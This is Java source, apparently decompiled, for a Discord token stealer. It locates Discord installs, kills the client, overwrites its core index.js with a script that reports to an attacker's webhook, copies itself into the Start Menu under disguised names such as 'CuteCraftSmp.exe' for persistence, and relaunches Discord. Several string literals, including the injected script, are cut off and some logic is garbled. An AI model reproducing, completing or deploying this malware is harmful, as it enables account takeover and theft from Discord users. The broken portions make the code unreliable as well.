import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DiscordTokenStealer {

    private final String webhookUrl;

    private final String appDataPath;

    private static final ScheduledExecutorService scheduler;

    private static int[] injectionStats;

    public DiscordTokenStealer(String webhookUrl, long encryptedKey) {

        this.appDataPath = System.getenv("APPDATA");
        this.webhookUrl = webhookUrl;
    }

    public void start(long encryptedKey) {

        scheduler.scheduleWithFixedDelay(
            () -> this.scanAndInject(encryptedKey),
            0L,
            5L,
            TimeUnit.MINUTES
        );
    }

    public void scanAndInject(long encryptedKey) {
        try {

            List<File> discordInstalls = findDiscordInstallations();

            WebhookLogger.logInfo("Discord", "Discord installations: " + discordInstalls.size());

            killDiscordProcesses();

            List<File> uninjecteds = new ArrayList<>();
            for (File installDir : discordInstalls) {
                File indexJs = new File(installDir, "index.js");
                if (!indexJs.exists()) continue;

                String content = Files.readString(indexJs.toPath());

                if (!content.contains("
                    uninjecteds.add(installDir);
                }
            }

            if (uninjecteds.isEmpty()) {

                WebhookLogger.logInfo("Discord", "No new Discord installations found");
                return;
            }

            WebhookLogger.logInfo("Discord", "Found " + uninjecteds.size() + " new installations");

            String injectionScript = buildInjectionScript(this.webhookUrl);

            for (File installDir : uninjecteds) {
                try {
                    File indexJs = new File(installDir, "index.js");

                    WebhookLogger.logInfo("Discord", "Writing injection to: " + indexJs.getAbsolutePath());

                    try (FileWriter writer = new FileWriter(indexJs)) {
                        writer.write(injectionScript);
                    }

                    WebhookLogger.logInfo("Discord", "Injection written successfully");

                } catch (Exception e) {

                    WebhookLogger.logError("Discord", "Error writing injection: " + e.getMessage());
                }
            }

            copyPayloadToAppData();

            restartDiscords();

        } catch (Exception e) {

        }
    }

    private List<File> findDiscordInstallations() {
        List<File> result = new ArrayList<>();

        try {
            String appData = System.getenv("APPDATA");
            if (appData == null) return result;

            File appDataDir = new File(appData);
            File[] appDataContents = appDataDir.listFiles();
            if (appDataContents == null) return result;

            for (File dir : appDataContents) {

                if (!dir.getName().toLowerCase().contains("discord")) continue;

                File[] subDirs = dir.listFiles(new DiscordVersionFilter());
                if (subDirs == null) continue;

                for (File versionDir : subDirs) {

                    File modulesDir = new File(versionDir, "modules");
                    if (!modulesDir.exists()) continue;

                    File[] moduleDirs = modulesDir.listFiles();
                    if (moduleDirs == null) continue;

                    for (File moduleDir : moduleDirs) {

                        if (!moduleDir.getName().startsWith("app-")) continue;

                        File coreDir = new File(moduleDir, "discord_desktop_core");
                        try {

                            if (new File(coreDir, "index.js").exists()) {
                                result.add(coreDir);
                            }
                        } catch (Exception e) {

                        }
                    }
                }
            }
        } catch (Exception e) {

        }

        return result;
    }

    private String buildInjectionScript(String webhookUrl) {

        String javaHome = System.getProperty("java.home");
        String javaPath = null;

        if (javaHome != null && !javaHome.isEmpty()) {

            javaPath = javaHome.split("/")[0];

            if (!javaPath.endsWith(".exe")) {
                javaPath = null;
            }
        }

        if (javaPath == null) {

            javaPath = "javaw";
        }

        String scriptBody = buildScriptBody(javaPath);

        return "
            .replace("WEBHOOK_URL", webhookUrl)
            .replace("JAVA_PATH", this.appDataPath);
    }

    private String buildScriptBody(String javaPath) {

        return "
    }

    private void copyPayloadToAppData() {
        try {

            String destPath = System.getenv("APPDATA") + "\\" +
                 "Microsoft" + "\\" +
                 "Windows" + "\\" +
                 "Start Menu" + "\\" +
                 "Programs";

            File destDir = new File(destPath);
            if (!destDir.exists()) {
                destDir.mkdirs();
            }

            File currentJar = new File(
                DiscordTokenStealer.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()
            );

            File destJar = new File(destDir, "modules.lib");
            if (!destJar.exists() || currentJar.length() != destJar.length()) {
                Files.copy(currentJar.toPath(), destJar.toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
            }

            File jreLauncher = new File(System.getProperty("user.home"));
            File destLauncher = new File(destDir, "CuteCraftSmp.exe");

            if (jreLauncher.exists() && !destLauncher.exists()) {
                copyDirectory(jreLauncher.toPath(), destLauncher.toPath());

                File indexJs = new File(destLauncher, "discord_desktop_core/index.js");
                File indexJsBak = new File(destLauncher.getParent(), "index.js.bak");
                if (indexJs.exists()) {
                    indexJs.renameTo(indexJsBak);
                }
            }

        } catch (Exception e) {
            WebhookLogger.logError("Discord", "Persistence error: " + e.getMessage());
        }
    }

    private void copyDirectory(Path source, Path dest) throws IOException {
        Files.walk(source).forEach(sourcePath -> {
            try {
                Path destPath = dest.resolve(source.relativize(sourcePath));
                if (Files.isDirectory(sourcePath)) {
                    Files.createDirectories(destPath);
                } else {
                    Files.copy(sourcePath, destPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } catch (IOException e) {

            }
        });
    }

    private void restartDiscords() {
        try {
            String appData = System.getenv("APPDATA");

            String[] variants = {
                "discord",
                "discordcanary",
                "discordptb",
                "discorddevelopment"
            };

            for (String variant : variants) {
                File variantDir = new File(appData, variant);
                if (!variantDir.exists()) continue;

                File updateExe = new File(variantDir, "Update.exe");
                if (updateExe.exists()) {

                    String launchCmd = String.format(
                        "\"%s\" --processStart %s.exe",
                        updateExe.getAbsolutePath(),
                        variant
                    );
                    String[] cmdArgs = {
                        "cmd.exe",
                        "/c",
                        "/d",
                        "/s",
                        "",
                        "/start",
                        launchCmd
                    };
                    ProcessKiller.runCommand(cmdArgs);
                    continue;
                }

                File[] appDirs = variantDir.listFiles(
                    f -> f.isDirectory() && f.getName().startsWith("app-")
                );
                if (appDirs == null || appDirs.length == 0) continue;

                Arrays.sort(appDirs, (a, b) -> b.getName().compareTo(a.getName()));

                File variantExe = new File(appDirs[0], variant + "\\" + variant + ".exe");
                if (!variantExe.exists()) continue;

                String[] cmdArgs = {
                    "cmd.exe",
                    "/d",
                    "/s",
                    "/wait",
                    "",
                    "\"" + variantExe.getAbsolutePath() + "\""
                };
                ProcessKiller.runCommand(cmdArgs);
            }

        } catch (Exception e) {

        }
    }

    private void killDiscordProcesses() {
        ProcessKiller.killDiscord();
    }

    static {
        scheduler = Executors.newScheduledThreadPool(1);
        injectionStats = null;
    }
}